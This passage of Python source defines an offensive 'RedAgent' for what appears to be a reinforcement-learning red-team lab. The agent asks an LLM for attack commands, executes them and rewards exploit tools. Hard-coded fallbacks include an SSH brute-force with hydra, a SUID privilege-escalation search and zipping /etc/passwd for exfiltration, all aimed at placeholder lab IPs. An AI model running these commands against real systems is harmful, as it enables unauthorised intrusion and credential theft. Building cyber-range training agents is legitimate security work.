                            source="OrionAgent",
                            reason="Resource allocation directive"
                        )
                    
                    processing_result["action_taken"] = f"Added novel command to history: {novel_command}"
            
            # Log to memory router if available
            if hasattr(self, "memory_router") and self.memory_router:
                if hasattr(self.memory_router, 'log_directive_processed'):
                    # Generate a unique directive ID
                    directive_id = f"{source_agent}_{directive_type}_{priority}_{self.total_steps}"
                    self.memory_router.log_directive_processed(
                        directive_id=directive_id,
                        result=processing_result["action_taken"]
                    )
                else:
                    console.print("[yellow]⚠️ MemoryRouter missing log_directive_processed method[/yellow]")
            
            return processing_result
            
        except Exception as e:
            console.print(f"[red]❌ Error processing directive: {e}[/red]")
            processing_result["processed"] = False
            processing_result["error"] = str(e)
            return processing_result

    def execute_command(self, command):
        """
        Execute a command directly from the CLI and return the results.
        This method is called when a user types a command in the ARIASKA CLI.
        
        Args:
            command (str): The command to execute
            
        Returns:
            dict: A dictionary containing the command output and related information
        """
        try:
            console.print(f"[cyan]RedAgent executing: {command}[/cyan]")
            
            # Get current state from environment
            current_state = self.env.get_global_state() if hasattr(self, "env") else {}
            current_phase = current_state.get("phase", "recon")
            
            # Execute the command through the environment
            output = self.extract_output(command)
            
            # Process the command through the rule engine for proper analysis
            from core.logic.output_interpreter import analyze_output
            parsed_output = analyze_output(command, output)
            
            # Calculate reward based on the command and output
            reward = self.calculate_reward(0.0, parsed_output, command)
            
            # Update state and track the command
            if command not in self.command_history:
                self.command_history.append(command)
            
            # Get recommendations for next steps based on the output
            recommendations = []
            
            try:
                # Generate recommendations using the brain or GPT
                if hasattr(self, "redagent_brain") and self.redagent_brain:
                    try:
                        # Try to use RedAgentBrain for recommendations 
                        recommendations = self.redagent_brain.get_recommendations(
                            command=command, 
                            output=output, 
                            state=current_state
                        )
                    except Exception as brain_err:
                        console.print(f"[yellow]⚠ Brain recommendations error: {brain_err}, falling back to defaults[/yellow]")
                        # Provide fallback recommendations based on command type
                        if command.startswith("nmap"):
                            recommendations = [
                                {"command": f"nmap -sV -p 80,443 {current_state.get('target_ip', '10.10.10.10')}", 
                                 "params": "-sV -p", "why": "Check web services"},
                                {"command": f"gobuster dir -u http://{current_state.get('target_ip', '10.10.10.10')} -w /usr/share/dirb/wordlists/common.txt", 
                                 "params": "-w", "why": "Directory enumeration"}
                            ]
                        else:
                            recommendations = [
                                {"command": f"nmap -sT -sV {current_state.get('target_ip', '10.10.10.10')}", 
                                 "params": "-sS -sV", "why": "Basic recon scan (fallback)"},
                                {"command": "whoami", 
                                 "params": "", "why": "Check current user context"}
                            ]
                    
                # If no recommendations yet, try using GPT
                if not recommendations or len(recommendations) == 0:
                    try:
                        # Fall back to GPT-based recommendations with error handling
                        recommendation_prompt = (
                            f"You are ARIASKA's offensive strategist. Based on the command '{command}' "
                            f"and output: '{output[:300]}...', suggest 3 follow-up commands for phase '{current_phase}'. "
                            f"Format as a list of command objects with 'command', 'params', and 'why' fields. Keep it concise."
                        )
                        
                        # Try using GPT with a timeout
                        import concurrent.futures
                        with concurrent.futures.ThreadPoolExecutor() as executor:
                            future = executor.submit(
                                self.gpt_manager.gpt_request,
                                recommendation_prompt, 
                                task_type="recommendations",
                                model="local-llm"
                            )
                            try:
                                # Wait up to 600 seconds for local LLM response
                                gpt_response = future.result(timeout=600.0)
                                
                                # Parse the GPT response into recommendations
                                import json
                                try:
                                    # Try to parse as JSON if it looks like JSON
                                    if gpt_response and '{' in gpt_response and '}' in gpt_response:
                                        recs = json.loads(gpt_response)
                                        if isinstance(recs, list):
                                            recommendations = recs
                                        elif isinstance(recs, dict) and "recommendations" in recs:
                                            recommendations = recs["recommendations"]
                                        else:
                                            # Create recommendations from text
                                            recommendations = [{"command": gpt_response, "params": "Auto", "why": "GPT Suggestion"}]
                                    else:
                                        # Simple fallback format
                                        recommendations = [{"command": gpt_response, "params": "Auto", "why": "GPT Suggestion"}]
                                except json.JSONDecodeError:
                                    # If JSON parsing fails, create a simple recommendation
                                    recommendations = [{"command": gpt_response, "params": "Auto", "why": "GPT Suggestion"}]
                            except concurrent.futures.TimeoutError:
                                console.print(f"[yellow]⚠ GPT recommendation timed out, using defaults[/yellow]")
                                recommendations = [
                                    {"command": f"nmap -sT -sV {current_state.get('target_ip', '10.10.10.10')}", 
                                     "params": "-sS -sV", "why": "Basic recon scan (timeout fallback)"},
                                    {"command": "whoami", 
                                     "params": "", "why": "Check current user context"}
                                ]
                    except Exception as gpt_err:
                        console.print(f"[yellow]⚠ GPT recommendations error: {gpt_err}, using defaults[/yellow]")
                        recommendations = [
                            {"command": f"nmap -sT -sV {current_state.get('target_ip', '10.10.10.10')}", 
                             "params": "-sS -sV", "why": "Basic recon scan (error fallback)"},
                            {"command": "whoami", 
                             "params": "", "why": "Check current user context"}
                        ]
                            
            except Exception as e:
                console.print(f"[yellow]⚠ Error generating recommendations: {e}[/yellow]")
                import traceback
                console.print(traceback.format_exc())
                recommendations = [
                    {"command": f"nmap -sT -sV {current_state.get('target_ip', '10.10.10.10')}", 
                     "params": "-sS -sV", "why": "Basic recon scan (fallback)"},
                    {"command": f"gobuster dir -u http://{current_state.get('target_ip', '10.10.10.10')} -w /usr/share/dirb/wordlists/common.txt", 
                     "params": "", "why": "Web directory enumeration (fallback)"}
                ]
            
            # Track this command in statistics
            if hasattr(self, "stats_monitor") and self.stats_monitor:
                self.stats_monitor.log_step(
                    self.agent_id, 
                    reward, 
                    command=command,
                    phase=current_phase,
                    output=output[:100]  # Truncate output to avoid extremely large logs
                )
            
            # Log the command execution to the RedAgentBrain
            if hasattr(self, "redagent_brain") and self.redagent_brain:
                try:
                    self.redagent_brain.log_step(
                        state=current_state,
                        command=command,
                        output=output,
                        reward=reward,
                        success=parsed_output.get("success", False),
                        model="manual",  # Indicate this was a manual command
                        step=self.total_steps + 1,
                        episode=self.total_episodes
                    )
                except Exception as brain_log_err:
                    console.print(f"[yellow]⚠ Error logging to brain: {brain_log_err}[/yellow]")
            
            # Generate a reasoning explanation about the command
            gpt_reason = ""
            try:
                # Use a timeout here as well to avoid hanging
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    future = executor.submit(
                        self.gpt_manager.gpt_request,
                        f"Explain in one sentence what the command '{command}' does and what its output shows.", 
                        task_type="reasoning",
                        model="local-llm"
                    )
                    try:
                        # Wait up to 600 seconds for local LLM response
                        gpt_reason = future.result(timeout=600.0)
                    except concurrent.futures.TimeoutError:
                        gpt_reason = f"Manual command execution: {command}"
            except Exception:
                gpt_reason = f"Manual command execution: {command}"
                
            # Update stats
            self.total_steps += 1
            self.last_action = command
            self.last_reasoning = gpt_reason
            
            # Build and return the result dictionary
            # This matches the expected return format in main.py
            return {
                "output": output,
                "recommendations": recommendations,
                "phase": current_phase,
                "reward": reward,
                "alert": current_state.get("blue_team_alert", 0.0),
                "entropy": self.entropy_beta
            }
            
        except Exception as e:
            console.print(f"[red]❌ Error in execute_command: {e}[/red]")
            import traceback
            console.print(traceback.format_exc())
            return {
                "output": f"Error executing command: {str(e)}",
                "recommendations": [
                    {"command": "ls", "params": "", "why": "List files in current directory"},
                    {"command": "whoami", "params": "", "why": "Check current user context"}
                ],
                "phase": "error",
                "reward": -1.0,
                "alert": 0.0
            }
    
    def provide_reasoning(self, context_type: str, context_data: Dict[str, Any]) -> str:
        """Provide reasoning for a given context - only available in OrionAgent."""
        return f"RedAgent does not provide strategic reasoning. Use OrionAgent for strategic insights."
    
    # Implementation of BaseAgent abstract methods
    def act(self, state: Dict[str, Any]) -> Dict[str, Any]:
        """
        Enhanced action method that uses RedAgent's existing methods.
        """
        # Use RedAgent's existing action selection method
        phase = state.get("phase", "recon")
        command, reasoning = self.get_smart_command(state, phase)  # Unpack tuple
        
        # Calculate reward based on phase and action type
        reward = 0.0
        if phase == "recon":
            reward = 20.0 if "nmap" in command else 15.0
        elif phase == "enumeration": 
            reward = 25.0 if any(tool in command for tool in ["dirb", "gobuster", "enum4linux"]) else 20.0
        elif phase == "exploit":
            reward = 35.0 if any(tool in command for tool in ["msfconsole", "sqlmap", "hydra"]) else 25.0
        else:
            reward = 10.0
        
        return {
            "action": command,
            "success": True,
            "reward": reward,
            "info": {
                "phase": phase,
                "reasoning": reasoning,
                "decision_source": "gpt",
                "confidence": 0.8,
                "agent_role": "offense"
            }
        }
    
    def learn(self, state: Dict[str, Any], action: Dict[str, Any], 
             reward: float, next_state: Dict[str, Any], done: bool) -> float:
        """
        Enhanced learning method that uses RedAgent's existing training.
        """
        # Log the transition to replay buffer for training
        if hasattr(self, 'replay_buffer'):
            self.log_transition(state, action, reward, next_state)
        
        # Perform batch training if we have enough experiences
        loss = 0.0
        if hasattr(self, 'replay_buffer') and len(self.replay_buffer.buffer) >= self.batch_size:
            try:
                loss = self.train_on_batch()
            except Exception as e:
                print(f"Training error: {e}")
        
        # Additional RedAgent-specific learning
        if hasattr(self, 'redagent_brain'):
            self.redagent_brain.log_step(
                state=state,
                command=action.get("command", ""),
                gpt_response=action.get("reasoning", ""),
                output=next_state.get("output", ""),
                reward=reward,
                success=reward > 0,
                model=action.get("decision_source", "unknown"),
                tokens=action.get("gpt_tokens", 0),
                step=self.total_steps,
                episode=self.total_episodes
            )
        
        return float(loss) if loss is not None else 0.0
    
    def _get_phase_command(self, phase: str, state: Dict[str, Any]) -> str:
        """Get appropriate command for a specific phase."""
        target = state.get("target", "10.10.10.10")
        
        phase_commands = {
            "recon": f"nmap -sT -sV {target}",
            "enumeration": f"gobuster dir -u http://{target} -w /usr/share/dirb/wordlists/common.txt",
            "exploit": f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst ssh://{target}",
            "privesc": "find /usr /bin /sbin -perm -u=s -type f 2>/dev/null",
            "exfiltrate": "zip -r /tmp/data.zip /etc/passwd"
        }
        
        return phase_commands.get(phase, f"echo 'Phase {phase} command'")
    
    def _get_available_actions(self) -> List[str]:
        """Override BaseAgent method to provide RedAgent-specific actions."""
        return [
            "Reconnaissance - Network scanning and discovery",
            "Enumeration - Service and vulnerability enumeration", 
            "Exploitation - Exploit vulnerabilities for access",
            "Privilege Escalation - Gain higher privileges",
            "Data Exfiltration - Extract sensitive data"
        ]
    
    # --- Abstract Methods Required by EnhancedAgentBase ---
    
    async def perceive_environment(self) -> Dict[str, Any]:
        """Perceive and analyze the current environment state."""
        # Create a comprehensive state representation
        state = {
            "phase": "recon",
            "target": "10.10.10.10",
            "ports": [22, 80, 443],
            "services": ["ssh", "http", "https"],
            "vulnerabilities": [],
            "detection_risk": 0.0,
            "network_topology": {
                "subnets": ["10.10.10.0/24"],
                "hosts": ["10.10.10.10", "10.10.10.11"]
            },
            "agent_id": self.agent_id,
            "agent_type": "red",
            "total_steps": self.total_steps,
            "epsilon": self.epsilon
        }
        
        return state
    
    async def plan_action(self, state: Dict[str, Any]) -> Dict[str, Any]:
        """Plan the next action based on current state."""
        # Use existing get_smart_command method for planning
        phase = state.get("phase", "recon")
        command = self.get_smart_command(state, phase)
        
        action_plan = {
            "action_type": "command",
            "command": command,
            "target": state.get("target", "10.10.10.10"),
            "phase": phase,
            "confidence": 0.8,
            "source": "gpt"
        }
        
        return action_plan
    
    async def execute_action(self, action_plan: Dict[str, Any]) -> 'ActionResult':
        """Execute the planned action."""
        from core.agents.enhanced_agent_base import ActionResult
        
        command = action_plan.get("command", "echo 'no command'")
        target = action_plan.get("target", "10.10.10.10")
        
        # Use existing simulate_step method for execution
        result = self.simulate_step(
            episode=self.total_episodes, 
            step=self.total_steps
        )
        
        # Convert to ActionResult format with proper parameters
        action_result = ActionResult(
            action=command,
            success=result.get("success", True),
            reward=result.get("reward", 0.0),
            observation=result.get("state", {}),
            info=result.get("info", {"action": command, "target": target})
        )
        
        return action_result
    
    def get_action(self, env_state: Dict[str, Any], meta_learning: bool = False) -> str:
        """Get action for main.py compatibility."""
        phase = env_state.get("phase", "recon")
        command, _ = self.get_smart_command(env_state, phase)  # Extract just the command
        return command
    
    def provide_strategic_insights(self) -> Dict[str, Any]:
        """Provide strategic insights for Orion agent role."""
        insights = {
            "total_episodes": getattr(self, 'total_episodes', 0),
            "total_steps": getattr(self, 'total_steps', 0),
            "recent_performance": getattr(self, 'recent_rewards', []),
            "strategy_notes": f"Agent {self.agent_id} operating in {self.role} mode",
            "learning_phase": "active_training"
        }
        return insights
    
    def save_state(self, filepath: str) -> bool:
        """Save agent state for compatibility."""
        try:
            import pickle
            import os
            
            # Create directory if it doesn't exist
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            state = {
                'agent_id': self.agent_id,
                'role': self.role,
                'total_episodes': getattr(self, 'total_episodes', 0),
                'total_steps': getattr(self, 'total_steps', 0),
                'epsilon': getattr(self, 'epsilon', 0.1),
                'recent_rewards': getattr(self, 'recent_rewards', [])
            }
            
            with open(f"{filepath}_state.pkl", 'wb') as f:
                pickle.dump(state, f)
            
            return True
        except Exception as e:
            logging.error(f"Failed to save agent state: {e}")
            return False
    
    def save(self, filepath: str) -> bool:
        """Save agent for compatibility."""
        return self.save_state(filepath)
